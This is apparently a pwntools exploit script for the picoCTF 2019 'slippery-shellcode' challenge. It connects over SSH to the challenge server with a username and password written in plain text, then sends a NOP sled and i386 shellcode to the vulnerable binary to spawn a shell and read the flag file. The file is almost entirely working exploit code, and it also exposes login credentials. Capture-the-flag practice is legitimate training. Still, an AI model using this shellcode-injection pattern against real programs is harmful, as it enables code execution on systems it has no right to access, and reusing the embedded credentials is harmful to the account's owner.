from pwn import *
import sys

argv = sys.argv

DEBUG = False
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

s = ssh(host='2019shell1.picoctf.com', user='kfukuta', password="qwe123qwe")
sh = s.process('/problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8/vuln')
REMOTE = True

x = b'\x90'*256 + asm(shellcraft.i386.linux.sh())

sh.sendlineafter(':\n', x)
sh.sendlineafter('$ ', 'cat /problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8/flag.txt')
sh.interactive()
# res = sh.recvall()
# print(res)
